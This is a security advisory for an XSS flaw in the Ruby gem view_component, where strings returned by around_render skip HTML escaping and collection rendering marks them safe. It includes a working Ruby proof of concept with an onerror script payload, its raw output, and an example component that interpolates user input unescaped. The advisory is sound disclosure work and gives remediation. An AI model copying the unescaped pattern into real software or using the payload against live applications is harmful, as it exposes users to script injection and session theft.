# [H] ViewComponent: around_render HTML-Safety Bypass

## Summary
Severity: High
Advisory: GHSA-97jw-64cj-jc58
CVE: CVE-2026-54498
CWE: CWE-79
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-97jw-64cj-jc58
Type: github-advisory

## Affected
- RubyGems: `view_component` — affected >=4.0.0 <4.12.0

## Details
## Summary

`ViewComponent::Base#around_render` can return HTML-unsafe strings that bypass the escaping behavior applied to normal `#call` return values. This creates an XSS risk when downstream applications use `around_render` to wrap, replace, instrument, or conditionally return content that includes user-controlled data.

The issue is especially dangerous in collection rendering because `ViewComponent::Collection#render_in` joins the per-item results and marks the entire output as `html_safe`, converting raw unsafe output into a trusted `ActiveSupport::SafeBuffer`.


## Affected Code

Validated against:

- Repository commit: `eea79445`
- Ruby: `3.4.9`

Relevant locations:

- `lib/view_component/base.rb`
  - `render_in`
  - `around_render`
  - `__vc_maybe_escape_html`
- `lib/view_component/template.rb`
  - `InlineCall#safe_method_name_call`
- `lib/view_component/collection.rb`
  - `Collection#render_in`

Key code paths:

```ruby
# lib/view_component/base.rb
around_render do
  render_template_for(@__vc_requested_details).to_s
end
```

```ruby
# lib/view_component/template.rb
proc do
  __vc_maybe_escape_html(send(m)) do
    Kernel.warn(...)
  end
end
```

```ruby
# lib/view_component/collection.rb
components.map do |component|
  component.render_in(view_context, &block)
end.join(rendered_spacer(view_context)).html_safe
```

## Root Cause

Normal inline `#call` output is passed through `__vc_maybe_escape_html`, which escapes HTML-unsafe strings. However, when `around_render` itself returns a string, the returned value becomes the component render result without being passed through the same HTML-safety boundary.

This creates two different output-safety behaviors:

- `#call` returning unsafe string: escaped
- `#around_render` returning unsafe string: raw

Collection rendering then amplifies the issue by calling `.html_safe` on the joined result.

## Proof of Concept

Run from the repository root:

```ruby
$LOAD_PATH.unshift File.expand_path("lib", Dir.pwd)
require "action_controller/railtie"
require "rack/mock"
require "view_component/base"

class PocController < ActionController::Base; end

def vc
  c = PocController.new
  c.set_request!(ActionDispatch::Request.new(Rack::MockRequest.env_for("/poc")))
  c.set_response!(ActionDispatch::Response.new)
  c.view_context
end

PAYLOAD = "<img src=x onerror=alert(1)>"

class UnsafeCallComponent < ViewComponent::Base
  def initialize(payload:) = @payload = payload
  def call = @payload
end

class UnsafeAroundComponent < ViewComponent::Base
  def initialize(payload:) = @payload = payload
  def call = "SAFE"
  def around_render = @payload
end

class UnsafeAroundCollectionComponent < ViewComponent::Base
  with_collection_parameter :payload
  def initialize(payload:) = @payload = payload
  def call = "SAFE"
  def around_render = @payload
end

view_context = vc

normal = UnsafeCallComponent.new(payload: PAYLOAD).render_in(view_context)
around = UnsafeAroundComponent.new(payload: PAYLOAD).render_in(view_context)
collection = UnsafeAroundCollectionComponent.with_collection([PAYLOAD]).render_in(view_context)

puts "normal_call=#{normal}"
puts "normal_call_raw=#{normal.include?(PAYLOAD)} html_safe=#{normal.html_safe?}"
puts "around_render=#{around}"
puts "around_render_raw=#{around.include?(PAYLOAD)} html_safe=#{around.html_safe?}"
puts "collection=#{collection}"
puts "collection_raw=#{collection.include?(PAYLOAD)} html_safe=#{collection.html_safe?}"

c = PocController.new
c.set_request!(ActionDispatch::Request.new(Rack::MockRequest.env_for("/poc")))
c.set_response!(ActionDispatch::Response.new)
out = c.render_to_string(UnsafeAroundComponent.new(payload: PAYLOAD))
puts "controller_render_to_string=#{out}"
puts "controller_raw=#{out.include?(PAYLOAD)} html_safe=#{out.html_safe?}"
```

Observed output:

```text
normal_call=&lt;img src=x onerror=alert(1)&gt;
normal_call_raw=false html_safe=true
around_render=<img src=x onerror=alert(1)>
around_render_raw=true html_safe=false
collection=<img src=x onerror=alert(1)>
collection_raw=true html_safe=true
controller_render_to_string=<img src=x onerror=alert(1)>
controller_raw=true html_safe=false
```

The control case confirms that normal `#call` output is escaped. The `around_render` cases confirm that the same payload is emitted raw.

## Exploit Scenario

A downstream application defines a component that uses `around_render` for tracing, layout wrapping, feature-flag fallback, error fallback, or instrumentation. If the hook returns a string containing request data, model attributes, CMS content, markdown output, or other attacker-controlled values, the value can be rendered as raw HTML.

Example vulnerable pattern:

```ruby
class BannerComponent < ViewComponent::Base
  def initialize(message:)
    @message = message
  end

  def call
    "fallback"
  end

  def around_render
    "<div class=\"banner\">#{@message}</div>"
  end
end
```

If `message` is user-controlled, scriptable HTML reaches the browser.

## Impact

Successful exploitation allows XSS in applications using affected components. Depending on application context, impact can include:

- session or token theft where cookies/tokens are accessible
- authenticated actions as the victim
- CSRF bypass through same-origin script execution
- exfiltration of page data
- credential phishing or UI redress inside trusted application origin

The collection path is particularly risky because it converts the joined raw output to `html_safe`, which can suppress later escaping.

## Preconditions

- The application defines or uses a component overriding `around_render`.
- `around_render` returns or wraps attacker-influenced HTML-unsafe content.
- The component is rendered in a browser-visible response.
- Higher impact when rendered through `ViewComponent::Collection` or controller/direct rendering.

## Chaining Potential

This finding can chain with:

- preview routes or examples that accept URL parameters and render components
- unsafe markdown or CMS content rendered inside `around_render`
- CSP-disabled preview routes
- applications that expose admin-only pages containing affected components

## Remediation

Apply the same HTML-safety enforcement to `around_render` return values that is applied to normal inline `#call` output.

Possible approaches:

1. Wrap the result of `around_render` with `__vc_maybe_escape_html` when the current template is HTML.
2. Require `around_render` to return an `ActiveSupport::SafeBuffer` to opt into raw HTML.
3. In collection rendering, avoid blindly calling `.html_safe` on joined component outputs unless each item has been normalized through the same safety boundary.

## References
- https://github.com/ViewComponent/view_component/security/advisories/GHSA-97jw-64cj-jc58
- https://github.com/ViewComponent/view_component/commit/48e5fd2d602344c7d33019fbc5c8b087e315bb78
- https://github.com/ViewComponent/view_component
- https://github.com/ViewComponent/view_component/releases/tag/v4.12.0
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-54498.yml
- https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54498
